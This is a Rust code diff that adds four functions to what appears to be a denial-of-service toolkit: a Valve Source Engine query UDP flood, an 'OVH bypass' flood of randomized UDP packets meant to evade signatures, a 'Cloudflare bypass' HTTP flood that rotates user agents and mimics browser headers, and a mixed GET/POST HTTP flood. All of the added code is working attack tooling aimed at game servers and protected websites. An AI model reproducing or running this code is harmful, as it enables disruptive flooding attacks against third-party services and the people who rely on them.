@@ -698,3 +698,225 @@ pub async fn connection_exhaustion(target: &str, port: u16, duration_secs: u64) 
     println!("Connection Exhaustion complete. Peak connections held: {}", final_count);
     println!("Total connection attempts: {}", connection_count.load(Ordering::Relaxed));
 }
+
+pub async fn vse_flood(target: &str, port: u16, duration_secs: u64) {
+    println!("Starting VSE (Valve Source Engine) flood on {}:{} for {} seconds", target, port, duration_secs);
+    
+    let target_ip: IpAddr = match target.parse() {
+        Ok(ip) => ip,
+        Err(_) => {
+            eprintln!("Invalid IP address: {}", target);
+            return;
+        }
+    };
+    
+    let target_addr = SocketAddr::new(target_ip, port);
+    let packet_count = Arc::new(AtomicU64::new(0));
+    let duration = Duration::from_secs(duration_secs);
+    let end_time = Instant::now() + duration;
+    
+    // TSource Engine Query payload
+    let payload = b"\xFF\xFF\xFF\xFFTSource Engine Query\x00".to_vec();
+    
+    let num_workers = get_worker_count();
+    println!("Using {} workers (CPU cores: {})", num_workers, num_cpus::get());
+    let mut handles = vec![];
+    
+    for _ in 0..num_workers {
+        let packet_count = packet_count.clone();
+        let payload = payload.clone();
+        
+        let handle = tokio::spawn(async move {
+            let socket = match UdpSocket::bind("0.0.0.0:0").await {
+                Ok(s) => s,
+                Err(e) => {
+                    eprintln!("Error binding UDP socket: {}", e);
+                    return;
+                }
+            };
+            
+            while Instant::now() < end_time {
+                if socket.send_to(&payload, target_addr).await.is_ok() {
+                    packet_count.fetch_add(1, Ordering::Relaxed);
+                }
+            }
+        });
+        
+        handles.push(handle);
+    }
+    
+    for handle in handles {
+        let _ = handle.await;
+    }
+    
+    println!("VSE flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
+}
+
+pub async fn ovh_flood(target: &str, port: u16, duration_secs: u64) {
+    println!("Starting OVH Bypass flood on {}:{} for {} seconds", target, port, duration_secs);
+    
+    let target_ip: IpAddr = match target.parse() {
+        Ok(ip) => ip,
+        Err(_) => {
+            eprintln!("Invalid IP address: {}", target);
+            return;
+        }
+    };
+    
+    let target_addr = SocketAddr::new(target_ip, port);
+    let packet_count = Arc::new(AtomicU64::new(0));
+    let duration = Duration::from_secs(duration_secs);
+    let end_time = Instant::now() + duration;
+    
+    let num_workers = get_worker_count();
+    println!("Using {} workers (CPU cores: {})", num_workers, num_cpus::get());
+    let mut handles = vec![];
+    
+    for _ in 0..num_workers {
+        let packet_count = packet_count.clone();
+        
+        let handle = tokio::spawn(async move {
+            let socket = match UdpSocket::bind("0.0.0.0:0").await {
+                Ok(s) => s,
+                Err(e) => {
+                    eprintln!("Error binding UDP socket: {}", e);
+                    return;
+                }
+            };
+            
+            while Instant::now() < end_time {
+                // OVH bypass often involves randomized payloads to bypass static signatures
+                let now = std::time::SystemTime::now()
+                    .duration_since(std::time::UNIX_EPOCH)
+                    .unwrap()
+                    .as_nanos();
+                let mut rng = rand::rngs::StdRng::seed_from_u64(now as u64);
+                
+                // Random size between 4 and 1400 bytes
+                let size = rng.gen_range(4..1400);
+                let mut payload = vec![0u8; size];
+                rng.fill(&mut payload[..]);
+                
+                if socket.send_to(&payload, target_addr).await.is_ok() {
+                    packet_count.fetch_add(1, Ordering::Relaxed);
+                }
+            }
+        });
+        
+        handles.push(handle);
+    }
+    
+    for handle in handles {
+        let _ = handle.await;
+    }
+    
+    println!("OVH flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
+}
+
+pub async fn cf_bypass_flood(target: &str, port: u16, duration_secs: u64) {
+    println!("Starting Cloudflare Bypass flood on {}:{} for {} seconds", target, port, duration_secs);
+    
+    let target_url = format!("http://{}:{}", target, port);
+    let request_count = Arc::new(AtomicU64::new(0));
+    let duration = Duration::from_secs(duration_secs);
+    let end_time = Instant::now() + duration;
+    
+    let user_agents = vec![
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
+    ];
+    
+    let num_workers = get_worker_count();
+    println!("Using {} workers (CPU cores: {})", num_workers, num_cpus::get());
+    let mut handles = vec![];
+    
+    for _ in 0..num_workers {
+        let target_url = target_url.clone();
+        let request_count = request_count.clone();
+        let user_agents = user_agents.clone();
+        
+        let handle = tokio::spawn(async move {
+            let client = reqwest::Client::builder()
+                .danger_accept_invalid_certs(true)
+                .build()
+                .unwrap_or_default();
+                
+            let counter = std::sync::atomic::AtomicU64::new(0);
+            
+            while Instant::now() < end_time {
+                let idx = counter.fetch_add(1, Ordering::Relaxed) as usize % user_agents.len();
+                let user_agent = user_agents[idx];
+                
+                // Mimic legitimate headers
+                if (client
+                    .get(&target_url)
+                    .header("User-Agent", user_agent)
+                    .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
+                    .header("Accept-Language", "en-US,en;q=0.5")
+                    .header("Connection", "keep-alive")
+                    .header("Upgrade-Insecure-Requests", "1")
+                    .header("Cache-Control", "max-age=0")
+                    .send()
+                    .await).is_ok()
+                {
+                    request_count.fetch_add(1, Ordering::Relaxed);
+                }
+            }
+        });
+        
+        handles.push(handle);
+    }
+    
+    for handle in handles {
+        let _ = handle.await;
+    }
+    
+    println!("CF Bypass flood complete. Requests sent: {}", request_count.load(Ordering::Relaxed));
+}
+
+pub async fn http_stress(target: &str, port: u16, duration_secs: u64) {
+    println!("Starting HTTP Stress Test on {}:{} for {} seconds", target, port, duration_secs);
+    
+    let target_url = format!("http://{}:{}", target, port);
+    let request_count = Arc::new(AtomicU64::new(0));
+    let duration = Duration::from_secs(duration_secs);
+    let end_time = Instant::now() + duration;
+    
+    let num_workers = get_worker_count() * 2; // Higher concurrency for stress test
+    println!("Using {} workers (CPU cores: {})", num_workers, num_cpus::get());
+    let mut handles = vec![];
+    
+    for _ in 0..num_workers {
+        let target_url = target_url.clone();
+        let request_count = request_count.clone();
+        
+        let handle = tokio::spawn(async move {
+            let client = reqwest::Client::new();
+            
+            while Instant::now() < end_time {
+                // Send mixed GET and POST requests
+                let is_post = rand::random::<bool>();
+                
+                let req = if is_post {
+                    let body: Vec<u8> = (0..1024).map(|_| rand::random()).collect();
+                    client.post(&target_url).body(body)
+                } else {
+                    client.get(&target_url)
+                };
+                
+                if req.send().await.is_ok() {
+                    request_count.fetch_add(1, Ordering::Relaxed);
+                }
+            }
+        });
+        
+        handles.push(handle);
+    }
+    
+    for handle in handles {
+        let _ = handle.await;
+    }
+    
+    println!("HTTP Stress Test complete. Requests sent: {}", request_count.load(Ordering::Relaxed));
+}
